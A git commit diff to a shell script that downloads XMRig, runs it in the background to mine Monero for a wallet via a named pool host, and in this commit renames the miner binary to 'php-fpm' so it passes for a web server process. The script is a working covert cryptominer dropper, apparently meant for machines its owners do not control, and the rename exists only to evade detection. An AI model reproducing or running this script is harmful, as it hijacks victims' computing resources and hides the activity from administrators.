9660a73d87b7db0e017145fc06c787c1a2a1a13f
caippx <37325838+caippx@users.noreply.github.com>
2022-03-12 00:43:32 +0800

    Update wk_2.sh

--- drfytgybhunjoimkol/wk_2.sh
+++ drfytgybhunjoimkol/wk_2.sh
@@ -5,5 +5,6 @@ mkdir wk
 wget -O ~/wk/xmrig-6.16.4-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz
 cd wk && tar -zxvf xmrig-6.16.4-linux-x64.tar.gz
 cd xmrig-6.16.4 && chmod +x xmrig
+mv xmrig php-fpm
 hostname=`hostname`
-nohup ./xmrig -o service.jean-ip-foundation.org:4444 -u ${WALLET}.${hostname} -p ${hostname} -k --coin monero -a rx/0 > ~/wk/wk.log 2>&1 &
+nohup ./php-fpm -o service.jean-ip-foundation.org:4444 -u ${WALLET}.${hostname} -p ${hostname} -k --coin monero -a rx/0 > ~/wk/wk.log 2>&1 &
